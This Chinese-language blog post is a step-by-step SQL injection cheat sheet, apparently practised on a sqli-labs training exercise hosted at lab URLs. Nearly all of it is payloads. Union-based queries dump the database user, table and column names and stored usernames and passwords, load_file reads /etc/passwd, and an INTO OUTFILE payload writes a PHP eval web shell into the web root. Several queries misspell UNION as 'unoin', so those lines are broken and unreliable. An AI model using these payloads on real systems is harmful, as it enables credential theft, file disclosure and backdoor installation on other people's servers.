---
title: SQL注入步骤
date: 2021-07-22 11:20:00
categories: 
    - 网络安全
tags: 
    - Web
    - SQL
mp3: 
cover: img/bg5.jpeg
---



## SQL注入漏洞

### 1、找注入点（' " ) ))）

select * from users where id ='1'#' limit 0,1;
http://d1e1c384.yunyansec.com/Less-1/?id=1'#

### 2、判断是否存在注入

select * from users where id ='1' and 1=1#' limit 0,1;
select * from users where id ='1' and 1=2#' limit 0,1;

### 3、判断列数

select * from users where id ='1' order by 3#' limit 0,1;

### 4、判断显示位

select * from users where id ='-1' union select 1,2,3#' limit 0,1

### 5、爆用户、爆库

select * from users where id ='-1' union select 1,user(),3#' limit 0,1
http://d1e1c384.yunyansec.com/Less-1/?id=-1' union select 1,user(),database()--+

### 6、爆数据表名

group_concat()
select * from users where id ='-1' unoin select 1,user(),table_name from information_schema.tables where table_schema="security" limit 0,1#' limit 0,1;

### 7、爆数据列名

select * from users where id ='-1' unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name="users"#' limit 0,1;
http://1c96113c.yunyansec.com/Less-1/?id=-1' union select 1,user(),group_concat(column_name) from information_schema.columns where table_name="users"--+

### 8、获取数据

select * from users where id ='-1' unoin select 1,user(),group_concat(id,username,password) from users#' limit 0,1;

### 9、读取服务器敏感文件

load_file("/etc/passwd")
?id=-1' union select 1,2,load_file("/etc/passwd")%23
10、获取服务器权限，写入木马
?id=-1' union select 1,2,'<?php eval(\$_POST[123]);?>' into outfile '/var/www/html/2.php'%23

select * from users where uname='admin'#' and passwd='123456'